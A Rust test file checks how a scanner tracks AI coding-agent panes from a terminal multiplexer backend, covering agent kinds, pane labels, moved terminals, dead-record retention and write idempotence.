// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 ORASCOPE Co.,Ltd. (https://www.orascope.net)

//! What the scanner must and must not do to the store.

use herdrx::Pane;
use time::{Duration, OffsetDateTime};
use tower_scan::*;
use tower_state::{Agent, AgentState, Store};

/// Epoch itself means "never hooked", so the fixture clock starts well after it.
fn at(mins: i64) -> OffsetDateTime {
    OffsetDateTime::UNIX_EPOCH + Duration::days(20_000) + Duration::minutes(mins)
}

/// The workspace labels a listing would resolve; empty is the honest default
/// for a fixture that does not care about names.
fn labels() -> std::collections::HashMap<String, String> {
    std::collections::HashMap::new()
}

fn store() -> (tempfile::TempDir, Store) {
    let d = tempfile::tempdir().unwrap();
    let s = Store::new(d.path()).unwrap();
    (d, s)
}

/// Normalize both server labels and retained labels written by an old board
/// view, even when workspace.list supplies no labels on this pass.
#[test]
fn scanner_removes_workspace_display_prefixes_from_retained_labels() {
    let (_dir, store) = store();
    let pane = pane("w2:p1", Some("claude"), "idle", "/proj");
    let labels = [("w2".into(), "[w2]dbstore".into())].into_iter().collect();
    sync(&store, std::slice::from_ref(&pane), &labels, at(0)).unwrap();
    let mut record = store.load("claude-w2:p1").unwrap();
    assert_eq!(record.pane.session, "dbstore");
    record.pane.session = "[w2]dbstore".into();
    store.save(&record).unwrap();
    sync(&store, &[pane], &Default::default(), at(1)).unwrap();
    assert_eq!(store.load("claude-w2:p1").unwrap().pane.session, "dbstore");
}

/// Builds the pane shape the backend actually sends.
fn pane(pane_id: &str, agent: Option<&str>, status: &str, cwd: &str) -> Pane {
    let session = if agent.is_some() {
        r#","agent_session":{"agent":"claude","kind":"id","source":"herdr:claude","value":"sid-1"}"#
    } else {
        ""
    };
    let agent_field = agent
        .map(|a| format!(r#""agent":"{a}","#))
        .unwrap_or_default();
    serde_json::from_str(&format!(
        r#"{{"pane_id":"{pane_id}","workspace_id":"w2","tab_id":"w2:t7","cwd":"{cwd}",
            {agent_field}"agent_status":"{status}"{session}}}"#
    ))
    .unwrap()
}

/// An opencode pane as a live `pane.list` sends it: no `agent_session` at all,
/// which `pane()` would add.
fn opencode_pane(status: &str) -> Pane {
    serde_json::from_str(&format!(
        r#"{{"pane_id":"w1W:p5","workspace_id":"w1W","tab_id":"w1W:t1",
            "cwd":"/proj","agent":"opencode","agent_status":"{status}"}}"#
    ))
    .unwrap()
}

/// The kind arrives with the listing; nothing is inferred from a process name.
#[test]
fn kind_folds_backend_names() {
    assert_eq!(kind(Some("claude")), Some("claude"));
    assert_eq!(kind(Some("codex")), Some("codex"));
    assert_eq!(
        kind(Some("agy")),
        Some("gemini"),
        "Antigravity CLI is supervised as gemini"
    );
    assert_eq!(
        kind(Some("opencode")),
        Some("opencode"),
        "opencode keeps its own kind: nothing folds it into another vendor"
    );
    assert_eq!(
        kind(Some("node")),
        None,
        "no more guessing from process names"
    );
    assert_eq!(kind(None), None);
}

/// Every kind the fold can produce is one the rest of the tower supervises, and
/// every supervised kind comes back as itself. A fold that wrote a row for a
/// kind outside `SUPERVISED_KINDS` would be #74 again from the other side: a
/// row that `wake-all` and `close-all` skip.
#[test]
fn the_fold_produces_exactly_the_supervised_kinds() {
    let backend_names = [
        "claude", "codex", "gemini", "agy", "opencode", "aider", "node", "", "CLAUDE", "claude ",
    ];
    let mut produced: Vec<&str> = backend_names.iter().filter_map(|n| kind(Some(n))).collect();
    for k in &produced {
        assert!(
            tower_state::SUPERVISED_KINDS.contains(k),
            "{k:?} becomes a row but is not a supervised kind"
        );
    }
    produced.sort_unstable();
    produced.dedup();
    let mut supervised = tower_state::SUPERVISED_KINDS.to_vec();
    supervised.sort_unstable();
    assert_eq!(
        produced, supervised,
        "a supervised kind the fold never produces"
    );

    // Round trip: a supervised kind's own name folds onto itself.
    for k in tower_state::SUPERVISED_KINDS {
        assert_eq!(kind(Some(k)), Some(k));
    }
}

#[test]
fn discovers_agent_panes_and_ignores_shells() {
    let (_d, s) = store();
    let panes = vec![
        pane("w2:p1", Some("claude"), "working", "/proj"),
        pane("w2:p2", None, "unknown", "/proj"),
    ];
    sync(&s, &panes, &labels(), at(0)).unwrap();

    let got = s.list().unwrap();
    assert_eq!(got.len(), 1, "a shell pane is not an agent");
    assert_eq!(got[0].id, "claude-w2:p1");
    assert_eq!(got[0].cwd, "/proj");
    // sync places the record but leaves meaning to the observation pass.
    assert_eq!(got[0].state, AgentState::Idle);
}

#[test]
fn moving_a_terminal_keeps_its_agent_record_and_conversation() {
    let (_d, s) = store();
    let mut original = pane("w2:p1", Some("codex"), "waiting", "/proj");
    original.terminal_id = "terminal-1".into();
    sync(&s, &[original], &labels(), at(0)).unwrap();

    let mut before = s.load("codex-w2:p1").unwrap();
    before.state = AgentState::Waiting;
    before.task = "Keep this task".into();
    before.ask = "Keep this question".into();
    before.work_seq = 7;
    before.session_id = "conversation-1".into();
    s.save(&before).unwrap();

    let mut moved = pane("w7:p3", Some("codex"), "waiting", "/proj");
    moved.workspace_id = "w7".into();
    moved.tab_id = "w7:t2".into();
    moved.terminal_id = "terminal-1".into();
    let names = [("w7".to_string(), "new home".to_string())]
        .into_iter()
        .collect();
    sync(&s, &[moved.clone()], &names, at(1)).unwrap();
    assert_eq!(
        s.list()
            .unwrap()
            .iter()
            .map(|a| a.id.clone())
            .collect::<Vec<_>>(),
        ["codex-w2:p1"],
        "first scan must retain the original identity"
    );
    sync(&s, &[moved], &names, at(2)).unwrap();

    let records = s.list().unwrap();
    assert_eq!(records.len(), 1, "the old row must not become DEAD");
    let after = &records[0];
    assert_eq!(after.id, before.id);
    assert_eq!(after.pane.pane_id, "w7:p3");
    assert_eq!(after.pane.terminal_id, "terminal-1");
    assert_eq!(after.pane.workspace_id, "w7");
    assert_eq!(after.pane.session, "new home");
    assert_eq!(after.state, AgentState::Waiting);
    assert_eq!(after.task, before.task);
    assert_eq!(after.ask, before.ask);
    assert_eq!(after.work_seq, before.work_seq);
    assert_eq!(after.session_id, before.session_id);
    assert_eq!(after.born_at, before.born_at);
}

#[test]
fn a_different_terminal_does_not_take_over_a_missing_panes_record() {
    let (_d, s) = store();
    let mut original = pane("w2:p1", Some("codex"), "working", "/proj");
    original.terminal_id = "terminal-1".into();
    sync(&s, &[original], &labels(), at(0)).unwrap();
    let mut moved = pane("w7:p3", Some("codex"), "working", "/proj");
    moved.terminal_id = "terminal-2".into();
    sync(&s, &[moved], &labels(), at(1)).unwrap();

    assert_eq!(s.load("codex-w2:p1").unwrap().state, AgentState::Dead);
    assert_eq!(s.load("codex-w7:p3").unwrap().state, AgentState::Idle);
}

#[test]
fn a_reused_source_coordinate_cannot_take_a_moved_terminals_record() {
    for moved_first in [false, true] {
        let (_d, s) = store();
        let mut original = pane("w2:p1", Some("codex"), "working", "/proj");
        original.terminal_id = "terminal-old".into();
        sync(&s, &[original], &labels(), at(0)).unwrap();
        let mut old = s.load("codex-w2:p1").unwrap();
        old.task = "old task".into();
        old.session_id = "old-session".into();
        s.save(&old).unwrap();

        let mut moved = pane("w7:p3", Some("codex"), "working", "/proj");
        moved.workspace_id = "w7".into();
        moved.tab_id = "w7:t1".into();
        moved.terminal_id = "terminal-old".into();
        sync(&s, &[moved.clone()], &labels(), at(1)).unwrap();

        let mut newcomer = pane("w2:p1", Some("codex"), "working", "/proj");
        newcomer.terminal_id = "terminal-new".into();
        let both = if moved_first {
            vec![moved, newcomer]
        } else {
            vec![newcomer, moved]
        };
        sync(&s, &both, &labels(), at(2)).unwrap();
        sync(&s, &both, &labels(), at(3)).unwrap();

        let records = s.list().unwrap();
        assert_eq!(records.len(), 2, "scan order: moved first {moved_first}");
        let kept = s.load("codex-w2:p1").unwrap();
        assert_eq!(kept.pane.pane_id, "w7:p3");
        assert_eq!(kept.pane.terminal_id, "terminal-old");
        assert_eq!(kept.task, "old task");
        assert_eq!(kept.session_id, "old-session");
        let new = s.load("codex-w2:p1~1").unwrap();
        assert_eq!(new.pane.pane_id, "w2:p1");
        assert_eq!(new.pane.terminal_id, "terminal-new");
        assert!(new.task.is_empty());
    }
}

#[test]
fn moving_three_agents_is_order_independent_and_repeated_scans_are_idempotent() {
    for order in [
        [0, 1, 2],
        [0, 2, 1],
        [1, 0, 2],
        [1, 2, 0],
        [2, 0, 1],
        [2, 1, 0],
    ] {
        let (_d, s) = store();
        let mut originals = Vec::new();
        let mut moved = Vec::new();
        for n in 0..3 {
            let terminal_id = format!("term-{n}");
            let mut original = pane(&format!("w2:p{n}"), Some("codex"), "working", "/proj");
            original.terminal_id = terminal_id.clone();
            originals.push(original);
            let mut destination = pane(&format!("w7:p{n}"), Some("codex"), "working", "/proj");
            destination.workspace_id = "w7".into();
            destination.tab_id = "w7:t1".into();
            destination.terminal_id = terminal_id;
            moved.push(destination);
        }
        sync(&s, &originals, &labels(), at(0)).unwrap();
        for n in 0..3 {
            let mut a = s.load(&format!("codex-w2:p{n}")).unwrap();
            a.task = format!("task-{n}");
            a.work_seq = n as u64 + 1;
            a.session_id = format!("session-{n}");
            s.save(&a).unwrap();
        }

        let shuffled: Vec<_> = order.iter().map(|&index| moved[index].clone()).collect();
        sync(&s, &shuffled, &labels(), at(1)).unwrap();
        let mut first = s.list().unwrap();
        first.sort_by(|a, b| a.id.cmp(&b.id));
        assert_eq!(first.len(), 3, "order {order:?}");
        for (n, a) in first.iter().enumerate() {
            assert_eq!(a.id, format!("codex-w2:p{n}"), "order {order:?}");
            assert_eq!(a.pane.pane_id, format!("w7:p{n}"));
            assert_eq!(a.pane.terminal_id, format!("term-{n}"));
            assert_eq!(a.task, format!("task-{n}"));
            assert_eq!(a.work_seq, n as u64 + 1);
            assert_eq!(a.session_id, format!("session-{n}"));
        }
        sync(&s, &shuffled, &labels(), at(2)).unwrap();
        let mut second = s.list().unwrap();
        second.sort_by(|a, b| a.id.cmp(&b.id));
        assert_eq!(
            serde_json::to_value(first).unwrap(),
            serde_json::to_value(second).unwrap()
        );
    }
}

/// herdr recognizes opencode on its own, so the tower has to keep a row for it:
/// the pane exists, the backend names it, and a status comes with it.
/// Nothing in the row may depend on an `agent_session`; opencode sends none.
#[test]
fn an_opencode_pane_becomes_a_row() {
    let (_d, s) = store();
    let panes = vec![opencode_pane("working")];
    sync(&s, &panes, &labels(), at(0)).unwrap();

    let got = s.list().unwrap();
    assert_eq!(got.len(), 1, "opencode is supervised, not skipped");
    assert_eq!(got[0].id, "opencode-w1W:p5");
    assert_eq!(got[0].kind, "opencode");
    assert_eq!(got[0].session_id, "", "the backend sent no conversation ID");

    // The backend's word is the only state this kind ever gets, because no hook
    // for it exists.
    apply_observations(&s, &observations(&panes), at(1)).unwrap();
    assert_eq!(
        s.list().unwrap()[0].state,
        AgentState::Working,
        "herdr says working and there is no hook to disagree"
    );
}

/// With no hook ever heard, hook precedence never holds the row back: every
/// turn the backend reports lands at once, not two minutes later. A hookless
/// kind that froze at the first state it was seen in would be worse than no row.
#[test]
fn a_hookless_row_follows_every_backend_turn() {
    let (_d, s) = store();
    sync(&s, &[opencode_pane("idle")], &labels(), at(0)).unwrap();

    for (t, status, want) in [
        (1, "working", AgentState::Working),
        (2, "done", AgentState::DoneUnread),
        (3, "working", AgentState::Working),
        (4, "blocked", AgentState::Waiting),
        (5, "idle", AgentState::Idle),
    ] {
        let panes = [opencode_pane(status)];
        sync(&s, &panes, &labels(), at(t)).unwrap();
        apply_observations(&s, &observations(&panes), at(t)).unwrap();
        let got = s.load("opencode-w1W:p5").unwrap();
        assert_eq!(got.state, want, "herdr said {status} at minute {t}");
        assert!(
            !got.hook_fresh(at(t), HOOK_PRECEDENCE),
            "no hook ever fired"
        );
    }
}

/// The tab's label rides on every scan, keyed by the tab ID beside the
/// workspace labels; a tab renamed in herdr shows up at the next one.
#[test]
fn the_tab_label_is_taken_from_the_scan() {
    let (_d, s) = store();
    let panes = vec![pane("w2:p1", Some("claude"), "working", "/proj")];
    let mut labels = labels();
    labels.insert("w2".into(), "dbstore".into());
    labels.insert("w2:t7".into(), "pr-2752".into());
    sync(&s, &panes, &labels, at(0)).unwrap();
    let got = s.list().unwrap();
    assert_eq!(got[0].pane.session, "dbstore");
    assert_eq!(got[0].pane.tab, "pr-2752");

    labels.insert("w2:t7".into(), "review".into());
    sync(&s, &panes, &labels, at(1)).unwrap();
    assert_eq!(s.list().unwrap()[0].pane.tab, "review");
}

/// A tab and a pane the tower made carry their IDs in their names
/// (`[w2:t7] pr-2752`, `[w2:p1] hero`). The record keeps the names alone — the
/// IDs are its own fields — and one named before the prefix reads the same.
#[test]
fn the_id_prefix_is_left_off_the_recorded_names() {
    let (_d, s) = store();
    let mut p = pane("w2:p1", Some("claude"), "working", "/proj");
    p.label = Some("[w2:p1] hero-dark-codex".into());
    let mut labels = labels();
    labels.insert("w2:t7".into(), "[w2:t7] pr-2752".into());
    sync(&s, std::slice::from_ref(&p), &labels, at(0)).unwrap();
    let a = &s.list().unwrap()[0];
    assert_eq!(a.pane.tab, "pr-2752");
    assert_eq!(a.label, "hero-dark-codex");

    // A pane named only by its ID has no name: the row falls back to the
    // terminal title, as for an unnamed pane.
    p.label = Some("[w2:p1]".into());
    p.title = "Claude Code".into();
    sync(&s, std::slice::from_ref(&p), &labels, at(1)).unwrap();
    let a = &s.list().unwrap()[0];
    assert_eq!(a.label, "");
    assert_eq!(a.pane_title(), "Claude Code");
    assert_eq!(a.headline(), "Claude Code");

    // Somebody's own bracket is not an ID and is kept.
    p.label = Some("[wip] fix".into());
    labels.insert("w2:t7".into(), "pr-2752".into());
    sync(&s, std::slice::from_ref(&p), &labels, at(2)).unwrap();
    let a = &s.list().unwrap()[0];
    assert_eq!(a.pane.tab, "pr-2752");
    assert_eq!(a.label, "[wip] fix");
}

/// Which file holds each record, by inode: an atomic write replaces the file,
/// so an inode that moved is a record that was rewritten.
#[cfg(unix)]
fn inodes(dir: &std::path::Path) -> std::collections::HashMap<String, u64> {
    #[cfg(unix)]
    use std::os::unix::fs::MetadataExt;
    std::fs::read_dir(dir.join("agents"))
        .unwrap()
        .map(|e| e.unwrap())
        .map(|e| {
            let name = e.file_name().to_string_lossy().into_owned();
            (name, e.metadata().unwrap().ino())
        })
        .collect()
}

/// A hundred agents, and a pass in which nothing about them changed, writes
/// nothing: every write is a full flush with the store lock held, and hooks
/// wait on that lock. One pane retitled is one record rewritten.
#[cfg(unix)]
#[test]
fn a_pass_that_changes_nothing_writes_nothing_at_a_hundred_agents() {
    let (d, s) = store();
    let mut panes: Vec<Pane> = (0..100)
        .map(|i| pane(&format!("w2:p{i}"), Some("claude"), "working", "/proj"))
        .collect();
    sync(&s, &panes, &labels(), at(0)).unwrap();
    assert_eq!(s.list().unwrap().len(), 100);
    let before = inodes(d.path());

    sync(&s, &panes, &labels(), at(1)).unwrap();
    assert_eq!(
        inodes(d.path()),
        before,
        "nothing changed, nothing rewritten"
    );

    panes[7].title = "a new turn".into();
    sync(&s, &panes, &labels(), at(2)).unwrap();
    let after = inodes(d.path());
    let rewritten: Vec<&String> = after
        .iter()
        .filter(|(name, ino)| before.get(*name) != Some(ino))
        .map(|(name, _)| name)
        .collect();
    assert_eq!(rewritten, ["claude-w2:p7.json"], "only the retitled pane");
    let seven = s
        .list()
        .unwrap()
        .into_iter()
        .find(|a| a.id == "claude-w2:p7")
        .unwrap();
    assert_eq!(seven.title, "a new turn");
}

// ── g4testadd: tab labels through the scan ──────────────────────────────

/// An agent pane in a given workspace and tab, which [`pane`] pins to `w2` and
/// `w2:t7`.
#[cfg(unix)]
fn pane_in(pane_id: &str, workspace: &str, tab: &str) -> Pane {
    serde_json::from_str(&format!(
        r#"{{"pane_id":"{pane_id}","workspace_id":"{workspace}","tab_id":"{tab}",
            "cwd":"/proj","agent":"claude","agent_status":"idle"}}"#
    ))
    .unwrap()
}

/// Cross validation over generated layouts: every record wears its own tab's
/// label — or none, for a tab the map does not name — beside its workspace's
/// name, however many workspaces and tabs share the one label map. And the
/// two halves of the change meet: a repeated pass rewrites nothing, and
/// renaming one tab rewrites exactly the records of the panes in it.
#[cfg(unix)]
#[test]
fn every_record_wears_its_own_tabs_label_and_only_a_renamed_tab_is_rewritten() {
    let names = ["", "pr-2752", "리뷰", "🗼 tower", "7", "a › b"];
    let mut rng = tower_testrng::Rng::new(2426);
    for round in 0..12 {
        let (d, s) = store();
        let mut labels = labels();
        for w in 1..=3 {
            labels.insert(format!("w{w}"), format!("ws-{w}"));
            for t in 0..3 {
                let name = names[rng.below(names.len())];
                if !name.is_empty() {
                    labels.insert(format!("w{w}:t{t}"), name.to_string());
                }
            }
        }
        let panes: Vec<Pane> = (0..1 + rng.below(12))
            .map(|i| {
                let w = 1 + rng.below(3);
                pane_in(
                    &format!("w{w}:p{i}"),
                    &format!("w{w}"),
                    &format!("w{w}:t{}", rng.below(3)),
                )
            })
            .collect();
        sync(&s, &panes, &labels, at(0)).unwrap();

        for p in &panes {
            let a = s.load(&format!("claude-{}", p.pane_id)).unwrap();
            let want_tab = labels.get(&p.tab_id).map_or("", String::as_str);
            assert_eq!(a.pane.tab, want_tab, "round {round}: {}", p.pane_id);
            assert_eq!(a.pane.session, labels[&p.workspace_id], "round {round}");
        }

        let before = inodes(d.path());
        sync(&s, &panes, &labels, at(1)).unwrap();
        assert_eq!(inodes(d.path()), before, "round {round}: nothing changed");

        let renamed = panes[0].tab_id.clone();
        labels.insert(renamed.clone(), format!("renamed in round {round}"));
        sync(&s, &panes, &labels, at(2)).unwrap();
        let after = inodes(d.path());
        let mut rewritten: Vec<String> = after
            .iter()
            .filter(|(name, ino)| before.get(*name) != Some(ino))
            .map(|(name, _)| name.clone())
            .collect();
        rewritten.sort();
        let mut in_tab: Vec<String> = panes
            .iter()
            .filter(|p| p.tab_id == renamed)
            .map(|p| format!("claude-{}.json", p.pane_id))
            .collect();
        in_tab.sort();
        assert_eq!(rewritten, in_tab, "round {round}: only the renamed tab");
    }
}

/// A herdr server answering each method with a fixed body, one request per
/// connection — enough for a scan's own calls. Anything else is an error.
#[cfg(unix)]
fn serve(answers: Vec<(&'static str, String)>) -> (tempfile::TempDir, herdrx::Herdr) {
    use std::io::{BufRead, BufReader, Write};
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("h.sock");
    let listener = std::os::unix::net::UnixListener::bind(&path).unwrap();
    let answers: std::collections::HashMap<&str, String> = answers.into_iter().collect();
    std::thread::spawn(move || {
        for conn in listener.incoming() {
            let Ok(mut conn) = conn else { return };
            let mut line = String::new();
            if BufReader::new(&conn).read_line(&mut line).unwrap_or(0) == 0 {
                continue;
            }
            let req: serde_json::Value = serde_json::from_str(&line).unwrap();
            let body = answers
                .get(req["method"].as_str().unwrap_or_default())
                .cloned()
                .unwrap_or_else(|| r#"{"error":{"code":"unknown","message":"no"}}"#.into());
            let body = serde_json::from_str::<serde_json::Value>(&body)
                .expect("fixture")
                .to_string();
            let _ = conn.write_all(format!("{body}\n").as_bytes());
        }
    });
    (dir, herdrx::Herdr::at(path))
}

#[cfg(unix)]
const TWO_TABS: &str = r#"[
    {"tab_id":"w2:t7","workspace_id":"w2","label":"pr-2752"},
    {"tab_id":"w2:t8","workspace_id":"w2","label":""}
]"#;

/// Both ways a scan reaches herdr carry the tab label: the tower's snapshot
/// reads the snapshot's `tabs`, the CLI's plain pass reads `tab.list`, and
/// each puts them in the one map beside the workspace names without
/// displacing any. A CLI `status` after the tower's pass therefore finds the
/// record already right — it neither blanks the tab nor rewrites the file.
#[cfg(unix)]
#[test]
fn the_tower_and_the_cli_passes_agree_on_the_tab_label() {
    let pane = r#"{"pane_id":"w2:p1","workspace_id":"w2","tab_id":"w2:t7","cwd":"/proj",
        "agent":"claude","agent_status":"idle"}"#;
    let (_sock, herdr) = serve(vec![
        (
            "session.snapshot",
            format!(
                r#"{{"result":{{"snapshot":{{"panes":[{pane}],
                    "workspaces":[{{"workspace_id":"w2","label":"[w2]dbstore"}}],
                    "tabs":{TWO_TABS}}}}}}}"#
            ),
        ),
        ("pane.list", format!(r#"{{"result":{{"panes":[{pane}]}}}}"#)),
        (
            "workspace.list",
            r#"{"result":{"workspaces":[{"workspace_id":"w2","label":"[w2]dbstore"}]}}"#.into(),
        ),
        ("tab.list", format!(r#"{{"result":{{"tabs":{TWO_TABS}}}}}"#)),
    ]);
    let (d, s) = store();

    tower_scan::sync_backend_snapshot(&s, &herdr, at(0))
        .unwrap()
        .expect("the snapshot answered");
    let a = s.load("claude-w2:p1").unwrap();
    assert_eq!(a.pane.tab, "pr-2752");
    assert_eq!(
        a.pane.session, "dbstore",
        "the workspace name is still there"
    );

    let before = inodes(d.path());
    tower_scan::sync_backend(&s, &herdr, at(1)).unwrap();
    let a = s.load("claude-w2:p1").unwrap();
    assert_eq!(a.pane.tab, "pr-2752", "the CLI pass did not blank it");
    assert_eq!(a.pane.session, "dbstore");
    assert_eq!(inodes(d.path()), before, "nor rewrite the record");
}

/// The same for a named backend, whose snapshot pass has its own entry point.
#[cfg(unix)]
#[test]
fn a_named_backends_snapshot_carries_the_tab_label() {
    let (_sock, herdr) = serve(vec![(
        "session.snapshot",
        format!(
            r#"{{"result":{{"snapshot":{{"panes":[
                {{"pane_id":"w2:p1","workspace_id":"w2","tab_id":"w2:t7","cwd":"/proj",
                  "agent":"claude","agent_status":"idle"}}],
                "tabs":{TWO_TABS}}}}}}}"#
        ),
    )]);
    let (_d, s) = store();
    tower_scan::sync_named_backend_snapshot(&s, &herdr, "b0123456789abcdef", at(0))
        .unwrap()
        .expect("the snapshot answered");
    let a = s.load("claude-b0123456789abcdef-w2:p1").unwrap();
    assert_eq!(a.pane.tab, "pr-2752");
    assert_eq!(a.pane.session, "w2", "no workspace label, so its ID");
}

#[test]
fn identical_coordinates_on_two_backends_are_independent() {
    let (_d, s) = store();
    let same = [pane("w2:p1", Some("claude"), "idle", "/proj")];
    sync_for_backend(&s, &same, &labels(), "", at(0)).unwrap();
    sync_for_backend(&s, &same, &labels(), "b0123456789abcdef", at(0)).unwrap();

    let records = s.list().unwrap();
    assert_eq!(records.len(), 2);
    assert!(records.iter().any(|agent| agent.id == "claude-w2:p1"));
    assert!(records
        .iter()
        .any(|agent| agent.id == "claude-b0123456789abcdef-w2:p1"));

    sync_for_backend(&s, &[], &labels(), "", at(1)).unwrap();
    let records = s.list().unwrap();
    assert_eq!(
        records
            .iter()
            .find(|agent| agent.pane.backend.is_empty())
            .unwrap()
            .state,
        AgentState::Dead
    );
    assert_ne!(
        records
            .iter()
            .find(|agent| !agent.pane.backend.is_empty())
            .unwrap()
            .state,
        AgentState::Dead,
        "one backend disappearing must not kill another backend's record"
    );
}

/// A pane that stops being reported has gone.
#[test]
fn missing_pane_becomes_dead_then_is_cleaned_up() {
    let (_d, s) = store();
    sync(
        &s,
        &[pane("w2:p1", Some("claude"), "idle", "/proj")],
        &labels(),
        at(0),
    )
    .unwrap();

    sync(&s, &[], &labels(), at(1)).unwrap();
    assert_eq!(s.list().unwrap()[0].state, AgentState::Dead);

    // Kept for a day so somebody who stepped away still sees it.
    sync(&s, &[], &labels(), at(60)).unwrap();
    assert_eq!(s.list().unwrap().len(), 1);

    sync(&s, &[], &labels(), at(60 * 25)).unwrap();
    assert!(
        s.list().unwrap().is_empty(),
        "cleaned out after the retention window"
    );
}

/// A coordinate that comes back is a fresh observation, not a resurrection.
#[test]
fn reappearing_coordinate_resets_from_dead() {
    let (_d, s) = store();
    sync(
        &s,
        &[pane("w2:p1", Some("claude"), "idle", "/proj")],
        &labels(),
        at(0),
    )
    .unwrap();
    sync(&s, &[], &labels(), at(1)).unwrap();
    assert_eq!(s.list().unwrap()[0].state, AgentState::Dead);

    sync(
        &s,
        &[pane("w2:p1", Some("claude"), "idle", "/proj")],
        &labels(),
        at(2),
    )
    .unwrap();
    let got = s.list().unwrap();
    assert_eq!(got[0].state, AgentState::Idle);
    assert_eq!(got[0].state_since, at(2));
}

/// An ordinary new sibling is not a revival of whatever died in that folder.
///
/// The slot is `kind|session|cwd`, which two agents share. Treating any arrival
/// as a replacement deleted the dead record — the only place its session ID lives
/// — within seconds of somebody starting a second Claude in that folder.
#[test]
fn an_unrelated_new_agent_does_not_erase_a_dead_conversation() {
    let (_d, s) = store();
    sync(
        &s,
        &[pane("w2:p1", Some("claude"), "idle", "/proj")],
        &labels(),
        at(0),
    )
    .unwrap();
    // The conversation that record carries.
    let mut a = s.load("claude-w2:p1").unwrap();
    a.session_id = "sid-1".into();
    s.save(&a).unwrap();

    sync(&s, &[], &labels(), at(1)).unwrap();
    assert_eq!(s.load("claude-w2:p1").unwrap().state, AgentState::Dead);

    // Somebody starts another Claude in the same folder. The fixture gives every
    // pane the session `sid-1`… so this one is deliberately given another.
    let other = serde_json::from_str::<Pane>(
        r#"{"pane_id":"w2:p9","workspace_id":"w2","tab_id":"w2:t7","cwd":"/proj",
            "agent":"claude","agent_status":"idle",
            "agent_session":{"agent":"claude","kind":"id","source":"herdr:claude","value":"sid-2"}}"#,
    )
    .unwrap();
    sync(&s, std::slice::from_ref(&other), &labels(), at(2)).unwrap();
    assert!(
        s.load("claude-w2:p1").is_ok(),
        "an unrelated agent must not take a dead conversation with it"
    );

    // The same conversation coming back under a new pane *is* the replacement.
    let revived = serde_json::from_str::<Pane>(
        r#"{"pane_id":"w2:pA","workspace_id":"w2","tab_id":"w2:t7","cwd":"/proj",
            "agent":"claude","agent_status":"idle",
            "agent_session":{"agent":"claude","kind":"id","source":"herdr:claude","value":"sid-1"}}"#,
    )
    .unwrap();
    sync(&s, &[other, revived], &labels(), at(3)).unwrap();
    assert!(
        s.load("claude-w2:p1").is_err(),
        "one agent, one row, once it is plainly the same conversation"
    );
}

/// A failed label lookup must not rename every session at once.
///
/// `workspace.list` can fail while `pane.list` succeeds, and the empty map then
/// rewrote each record's human-readable session to its workspace ID. A record
/// that died before the next good refresh could no longer be resolved back to its
/// workspace — `names` accepts an ID only for an unlabeled one — so `restore`
/// would have built a duplicate beside the real workspace.
#[test]
fn a_lost_label_lookup_keeps_the_name_the_record_already_had() {
    let (_d, s) = store();
    let named_map = std::collections::HashMap::from([("w2".to_string(), "dev".to_string())]);
    let panes = [pane("w2:p1", Some("claude"), "idle", "/proj")];
    sync(&s, &panes, &named_map, at(0)).unwrap();
    let named = s.list().unwrap();
    assert_eq!(named[0].pane.session, "dev");

    // The same panes, with no labels at all — what a failed `workspace.list`
    // hands over.
    sync(&s, &panes, &labels(), at(1)).unwrap();
    assert_eq!(
        s.list().unwrap()[0].pane.session,
        "dev",
        "the name it already had beats the raw workspace ID"
    );

    // A record that never had one still falls back to the workspace ID: there is
    // nothing better to show, and a row has to say something. (The fixture puts
    // every pane in workspace `w2`, so that ID is what an unlabeled record wears.)
    let fresh = [pane("w9:p1", Some("claude"), "idle", "/other")];
    sync(&s, &fresh, &labels(), at(2)).unwrap();
    assert_eq!(s.load("claude-w9:p1").unwrap().pane.session, "w2");
}

/// A recycled coordinate carries none of the previous conversation.
///
/// herdr reuses base36 pane IDs, so a dead record's coordinate can come back as a
/// different agent. Resetting only the lifecycle state left the new row wearing
/// the old task, the old question, the old session ID and model, the old
/// completion acknowledgement, and a hook mark that would have let the previous
/// agent's hook outrank this one's own state for two minutes.
#[test]
fn a_recycled_coordinate_keeps_nothing_but_its_identity() {
    let (_d, s) = store();
    sync(
        &s,
        &[pane("w2:p1", Some("claude"), "idle", "/proj")],
        &labels(),
        at(0),
    )
    .unwrap();

    // What the previous conversation left on the record.
    let mut a = s.load("claude-w2:p1").unwrap();
    a.task = "리팩터링".into();
    a.ask = "이 파일 지워도 될까요?".into();
    a.session_id = "sess-old".into();
    a.model = "opus".into();
    a.done_acked = true;
    a.mark_hook(at(1));
    s.save(&a).unwrap();

    sync(&s, &[], &labels(), at(2)).unwrap();
    assert_eq!(s.load("claude-w2:p1").unwrap().state, AgentState::Dead);

    // The same coordinate, a different agent.
    sync(
        &s,
        &[pane("w2:p1", Some("claude"), "idle", "/proj")],
        &labels(),
        at(3),
    )
    .unwrap();

    let got = s.load("claude-w2:p1").unwrap();
    assert_eq!(got.state, AgentState::Idle);
    assert_eq!(got.state_since, at(3));
    assert_eq!(got.task, "", "the previous agent's task");
    assert_eq!(got.ask, "", "the previous agent's question");
    assert_eq!(got.session_id, "", "the previous conversation");
    assert_eq!(got.model, "", "the previous agent's model");
    assert!(!got.done_acked, "the previous completion's acknowledgement");
    assert!(
        !got.hook_fresh(at(3), HOOK_PRECEDENCE),
        "the previous agent's hook must not outrank this one"
    );
    // Identity and coordinates are what the pane actually told us.
    assert_eq!(got.kind, "claude");
    assert_eq!(got.cwd, "/proj");
    assert_eq!(got.pane.pane_id, "w2:p1");
}

/// Two agents of the same kind in one folder are two agents. Closing one must
/// not make the other look like its replacement.
///
/// The slot — `kind|session|cwd` — is not a unique identity. Counting every live
/// pane in it meant the survivor superseded the dead row on the next pass, and
/// the dead record is the only place its session ID lives: the conversation
/// became unresumable within seconds instead of waiting out the retention window.
#[test]
fn a_sibling_in_the_same_slot_does_not_supersede_a_dead_record() {
    let (_d, s) = store();
    let both = [
        pane("w2:p1", Some("claude"), "idle", "/proj"),
        pane("w2:p2", Some("claude"), "idle", "/proj"),
    ];
    sync(&s, &both, &labels(), at(0)).unwrap();
    assert_eq!(s.list().unwrap().len(), 2);

    // One is closed; the other has been there all along.
    let survivor = [pane("w2:p2", Some("claude"), "idle", "/proj")];
    sync(&s, &survivor, &labels(), at(1)).unwrap();
    assert_eq!(s.load("claude-w2:p1").unwrap().state, AgentState::Dead);

    // The pass that decides whether the dead row was superseded.
    sync(&s, &survivor, &labels(), at(2)).unwrap();
    let got = s.list().unwrap();
    assert_eq!(
        got.len(),
        2,
        "the dead conversation is still resumable — got {:?}",
        got.iter().map(|a| (&a.id, a.state)).collect::<Vec<_>>()
    );
}

